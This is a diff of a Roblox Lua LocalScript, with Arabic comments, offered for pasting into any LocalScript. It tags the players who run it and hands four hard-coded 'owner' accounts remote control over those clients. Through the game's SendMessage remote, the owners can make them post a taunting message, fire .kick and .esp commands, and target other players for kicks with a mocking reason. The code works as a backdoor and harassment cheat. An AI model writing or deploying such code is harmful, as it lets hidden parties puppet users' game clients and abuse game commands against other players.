@@ -1,10 +1,13 @@
---// ضع هذا الكود في آخر أي سكربت (LocalScript) عندك
+--// حط هذا الكود في آخر أي سكربت عندك (LocalScript)
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local SendMessage = ReplicatedStorage:WaitForChild("Events"):WaitForChild("SendMessage")
 local player = Players.LocalPlayer
+local pgui = player:WaitForChild("PlayerGui")
 
---// الأونرات الحقيقيين (يقدرون يستخدمون كل الأوامر)
+-- علامة إنك تستخدم السكربت
+player:SetAttribute("ScriptUser", true)
+
+-- الأونرات الحقيقيين (هم بس اللي أوامرهم تُنفذ فوراً)
 local Owners = {
     ["1il5i"] = true,
     ["eyad51533"] = true,
@@ -12,79 +15,83 @@ local Owners = {
     ["sj3zx"] = true,
 }
 
---// علامة إن اللاعب عنده السكربت
-player:SetAttribute("UsingScript", true)
+-- الريموت الصحيح اللي نراقبه
+local ChattedEvent = ReplicatedStorage:WaitForChild("Events"):WaitForChild("ChattedEvent")
 
-local function isOwner(p) return Owners[p.Name] end
-local function hasScript(p) return p:GetAttribute("UsingScript") == true end
-
---// الاستماع للشات
-player.Chatted:Connect(function(msg)
-    if not isOwner(player) then return end -- بس الأونرات يقدرون يكتبون الأوامر
-
-    local lower = msg:lower()
-
-    --// الأمر: .3mk all → يخلي كل اللي عندهم السكربت يرسلون الرسالة الزحفية
-    if lower == ".3mk all" then
-        SendMessage:FireServer(".3mk all")
-        task.wait(0.5)
-        for _, p in ipairs(Players:GetPlayers()) do
-            if hasScript(p) and p ~= player then
-                SendMessage:FireServer("عمًىانُيً اونًراتً سكًىرًبتً زحًفُفُ 🥺")
-            end
+-- دالة البحث عن لاعب (من حرفين فأكثر - اسم أو لقب)
+local function findTarget(partial)
+    if not partial or #partial < 2 then return nil end
+    partial = partial:lower()
+    for _, p in Players:GetPlayers() do
+        if p:GetAttribute("ScriptUser") and (p.Name:lower():find(partial) or p.DisplayName:lower():find(partial)) then
+            return p
         end
+    end
+    return nil
+end
+
+-- رسالة "السكربت شغال" وسط الشاشة 5 ثواني
+local gui = Instance.new("ScreenGui", pgui)
+gui.ResetOnSpawn = false
+local label = Instance.new("TextLabel", gui)
+label.Size = UDim2.new(0, 700, 0, 100)
+label.Position = UDim2.new(0.5, -350, 0.4, -50)
+label.BackgroundTransparency = 0.4
+label.BackgroundColor3 = Color3.new(0,0,0)
+label.TextColor3 = Color3.new(1, 0, 0)
+label.TextStrokeTransparency = 0
+label.Font = Enum.Font.GothamBlack
+label.TextSize = 50
+label.Text = "سكربت الأونرات مفعّل بالكامل ☠️"
+task.delay(5, function() gui:Destroy() end)
+
+-- المراقبة الحقيقية للريموت الصحيح
+ChattedEvent.OnClientEvent:Connect(function(senderPlayer, command)
+    -- التأكد إن المرسل من الأونرات
+    if not senderPlayer or not senderPlayer:IsA("Player") or not Owners[senderPlayer.Name] then
         return
     end
 
-    --// الأمر: .3mk [اسم جزئي] → يستهدف لاعب واحد عنده السكربت
-    if lower:sub(1,5) == ".3mk " then
-        local target = msg:sub(6)
-        if target == "" or target == "all" then return end
-        for _, p in ipairs(Players:GetPlayers()) do
-            if hasScript(p) and (p.DisplayName:lower():find(target:lower()) or p.Name:lower():find(target:lower())) then
-                SendMessage:FireServer(".3mk " .. p.DisplayName)
-                task.wait(0.3)
-                SendMessage:FireServer("عمًىانُيً اونًراتً سكًىرًبتً زحًفُفُ 🥺")
-                print("تم استهداف: " .. p.DisplayName)
-                return
-            end
+    if typeof(command) ~= "string" then return end
+    local msg = command:lower()
+
+    -- .3mk all → الكل يرسل الزحف
+    if msg == ".3mk all" then
+        game.ReplicatedStorage.Events.SendMessage:FireServer("عمًىانُيً اونًراتً سكًىرًبتً زحًفُفُ 🥺")
+
+    -- .3mk [اسم جزئي] → لاعب واحد بس
+    elseif msg:sub(1,5) == ".3mk " then
+        local targetName = command:sub(6)
+        local target = findTarget(targetName)
+        if target then
+            game.ReplicatedStorage.Events.SendMessage:FireServer(".3mk " .. target.DisplayName)
+            task.wait(0.1)
+            game.ReplicatedStorage.Events.SendMessage:FireServer("عمًىانُيً اونًراتً سكًىرًبتً زحًفُفُ 🥺")
         end
-        return
-    end
 
-    --// الأمر: .esp all → يفعّل ESP أبيض على كل اللي عندهم السكربت
-    if lower == ".esp all" then
-        SendMessage:FireServer(".esp all")
-        return
-    end
+    -- .esp all
+    elseif msg == ".esp all" then
+        game.ReplicatedStorage.Events.SendMessage:FireServer(".esp all")
 
-    --// الأمر: .unesp all → يطفي الـ ESP
-    if lower == ".unesp all" then
-        SendMessage:FireServer(".unesp all")
-        return
-    end
+    -- .unesp all
+    elseif msg == ".unesp all" then
+        game.ReplicatedStorage.Events.SendMessage:FireServer(".unesp all")
 
-    --// الأمر: .kick all [السبب]
-    --// أو .kick [اسم] [السبب]
-    if lower:sub(1,6) == ".kick " then
-        local rest = msg:sub(7)
-        local target, reason = rest:match("^(.-)%s+(.+)$")
-        if not target then target = rest end
-        if target == "" then return end
+    -- .kick all [سبب]
+    elseif msg:sub(1,6) == ".kick " then
+        local rest = command:sub(7)
+        local targetPart, reason = rest:match("^(.-)%s+(.+)$")
+        if not targetPart then targetPart = rest; reason = "عمكم انا" end
 
-        if target:lower() == "all" then
-            SendMessage:FireServer(".kick all " .. (reason or "عمكم انا"))
+        if targetPart:lower() == "all" then
+            game.ReplicatedStorage.Events.SendMessage:FireServer(".kick all " .. reason)
         else
-            for _, p in ipairs(Players:GetPlayers()) do
-                if hasScript(p) and (p.DisplayName:lower():find(target:lower()) or p.Name:lower():find(target:lower())) then
-                    SendMessage:FireServer(".kick " .. p.DisplayName .. " " .. (reason or "عمكم انا"))
-                    print("طرد: " .. p.DisplayName .. " | السبب: " .. (reason or "عمكم انا"))
-                    return
-                end
+            local target = findTarget(targetPart)
+            if target then
+                game.ReplicatedStorage.Events.SendMessage:FireServer(".kick " .. target.DisplayName .. " " .. reason)
             end
         end
-        return
     end
 end)
 
-print("تم تفعيل صلاحيات الأونر بنجاح | أنت الآن تتحكم بالكل")
+print("مراقبة ChattedEvent شغالة 100% - أوامر الأونرات تُنفذ فوراً من الريموت!")
